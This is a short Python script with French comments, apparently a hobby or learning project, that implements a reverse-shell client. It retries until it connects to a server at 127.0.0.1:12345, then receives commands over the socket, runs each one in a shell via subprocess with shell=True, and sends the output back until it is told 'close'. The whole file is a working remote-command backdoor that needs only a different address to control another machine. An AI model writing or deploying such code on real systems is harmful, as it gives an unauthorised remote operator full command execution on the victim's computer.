import socket
import subprocess

while True:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect(("127.0.0.1", 12345))
        break
    except:
        continue

print("Connecté au serveur")
client_socket.send("Hello World".encode())

while True:
    # recevoir la commande du serveur
    command = client_socket.recv(1024).decode()
    print(f"Serveur: {command}")

    if command.lower() == "close":
        print("Fermeture demandée par le serveur")
        client_socket.close()
        break

    # exécuter la commande
    result = subprocess.run(command, capture_output=True, text=True, shell=True)

    # préparer la réponse : stdout + stderr
    output = result.stdout + result.stderr
    if not output:   # si rien n'est renvoyé, prévenir
        output = "[Commande exécutée, mais aucune sortie]"

    # envoyer la réponse au serveur
    client_socket.send(output.encode())

    # Commandes troll
    